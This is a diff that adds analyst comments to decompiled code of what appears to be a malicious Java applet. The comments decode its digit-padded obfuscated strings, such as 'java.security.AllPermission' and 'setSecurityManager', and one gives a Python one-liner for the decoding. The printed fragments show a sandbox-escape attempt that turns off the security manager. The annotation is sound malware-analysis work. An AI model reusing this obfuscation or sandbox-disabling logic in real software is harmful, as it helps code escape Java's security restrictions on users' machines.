@@ -6,9 +6,9 @@
 /*     */ public class Issue
 /*     */   extends Applet
 /*     */ {
-/*   9 */   private static final String jse = csfn("986j56a4v35a.3s5e3c6u4r534it6y7.3P4e5r6m8i6s4s3i5o6n7s8");
-/*  10 */   private static final String jseA = csfn("23j5a64v6a.5s2e4c5u55r7i34ty.3A4l5l3645P6er46566m6i3s3645si6o3n2");
-/*  11 */   private boolean _is64 = System.getProperty(csfn("3o5s.6a2r5c5h2"), "").contains("64");
+/*   9 */   private static final String jse = csfn("986j56a4v35a.3s5e3c6u4r534it6y7.3P4e5r6m8i6s4s3i5o6n7s8");  // java.security.Permissions
+/*  10 */   private static final String jseA = csfn("23j5a64v6a.5s2e4c5u55r7i34ty.3A4l5l3645P6er46566m6i3s3645si6o3n2");  // java.security.AllPermission
+/*  11 */   private boolean _is64 = System.getProperty(csfn("3o5s.6a2r5c5h2"), "").contains("64");  // os.arch
 /*  12 */   static boolean _isWin = isWin();
 /*     */ 
 /*     */ 
@@ -28,7 +28,7 @@
 /*     */       
 /*  29 */       if (isOk())
 /*  30 */         System.exit(0); 
-/*  31 */       Resp resp = new Resp(csfn("234p34a55445c43654k632434234235"));
+/*  31 */       Resp resp = new Resp(csfn("234p34a55445c43654k632434234235"));  // pack
 /*     */     }
 /*  33 */     catch (Exception exception) {
 /*     */       
@@ -44,14 +44,14 @@
 /*     */   
 /*     */   public static boolean isWin() {
 /*  46 */     String str = System.getProperty("os.name").toLowerCase();
-/*  47 */     return (str.indexOf(csfn("456457w6734345i5645n4743457345")) >= 0);
+/*  47 */     return (str.indexOf(csfn("456457w6734345i5645n4743457345")) >= 0);  //  win
 /*     */   }
 /*     */ 
 /*     */ 
 /*     */   
 /*     */   private int myJob() throws Throwable {
 /*     */     try {
-/*  54 */       String str = csfn("64s33333e3333t333S55e666c777u5r333i534t76y2M34a55n76a88g666e44r2222");
+/*  54 */       String str = csfn("64s33333e3333t333S55e666c777u5r333i534t76y2M34a55n76a88g666e44r2222");  //  setSecurityManager
 /*  55 */       Class clazz = info1.syscla();
 /*  56 */       Object[] arrayOfObject1 = new Object[iCh(1)];
 /*  57 */       Object object1 = stac.stacO(clazz, str, arrayOfObject1);
@@ -111,7 +111,7 @@
 /*     */ 
 /*     */   
 /*     */   static String imgExt(String paramString) {
-/* 114 */     return csfn("777j7a7v7a7.7a7w7t7.77im727a7g7e7.7777") + paramString;
+/* 114 */     return csfn("777j7a7v7a7.7a7w7t7.77im727a7g7e7.7777") + paramString; //  java.awt.image.
 /*     */   }
 /*     */ 
 /*     */ 
@@ -136,6 +136,7 @@
 /*     */ 
 /*     */   
 /*     */   public static String csfn(String paramString) {
+              //  Use this python oneliner to decode the string: import re;re.sub(r"\d", "", "777j7a7v7a7.7a7w7t7.77im727a7g7e7.7777")
 /* 139 */     String str = "";
 /* 140 */     for (byte b = 0; b < paramString.length(); b++) {
 /*     */       
